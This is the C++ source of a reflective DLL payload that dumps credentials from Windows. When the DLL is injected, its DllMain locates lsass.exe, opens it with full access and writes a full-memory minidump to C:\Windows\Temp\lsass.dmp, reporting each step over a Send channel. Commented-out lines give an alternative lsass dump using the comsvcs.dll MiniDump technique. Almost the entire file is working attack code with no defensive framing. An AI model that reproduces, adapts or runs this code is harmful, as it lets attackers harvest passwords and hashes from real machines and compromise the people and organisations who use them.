#pragma comment (lib, "Dbghelp.lib")

//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include "Output.h"
#include <shellapi.h>

#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>

//using namespace std;

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;


/******************************************************************************************
Function:        ConvertCharToLPWSTR
Description: const char * turn LPWSTR
 Input: str: to be transformed const char * string type
 Return: LPWSTR type string after conversion
*******************************************************************************************/
LPWSTR ConvertCharToLPWSTR(const char* szString)
{
	int dwLen = strlen(szString) + 1;
	int nwLen = MultiByteToWideChar(CP_ACP, 0, szString, dwLen, NULL, 0); // calculating an appropriate length
	LPWSTR lpszPath = new WCHAR[dwLen];
	MultiByteToWideChar(CP_ACP, 0, szString, dwLen, lpszPath, nwLen);
	return lpszPath;
}


void  dump() {
	std::ostringstream out;
	DWORD lsassPID = 0;
	HANDLE lsassHandle = NULL;

	// Open a handle to lsass.dmp - this is where the minidump file will be saved to
	HANDLE outFile = CreateFileA("C:\\Windows\\Temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Find lsass PID	
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";

	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processName, L"lsass.exe") != 0) {
			Process32Next(snapshot, &processEntry);
			const char* c = processEntry.szExeFile;
			processName = ConvertCharToLPWSTR(c);
			lsassPID = processEntry.th32ProcessID;
		}
		out << "[+] Got lsass.exe PID: " << lsassPID << std::endl;
		Send(out.str().c_str());
	}

	// Open handle to lsass.exe process
	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);

	// Create minidump
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

	if (isDumped) {
		out << "[+] lsass dumped successfully!" << std::endl;
		Send(out.str().c_str());
	}

	return;
}



//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	char* Url;
	std::ostringstream out;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
           // MessageBoxA(NULL, "Hello from Reflective DLL!", "Success", MB_OK);
			//Url = (char*)lpReserved;
			//Url = "https://www.google.com";
		    //ShellExecute(0, 0, Url, 0, 0, SW_SHOW); // open the url
			//system("Powershell -c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1092 dump.bin full");
			//ShellExecute(NULL, "open", "powershell", "/c  rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1092 C:\\Windows\\Temp\\dump.dmp full", NULL, SW_NORMAL);
			dump();
			ExitProcess(0);
			out<< "exit host process." << std::endl;
			Send(out.str().c_str());
			//Send("Evening the Odds.");
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}
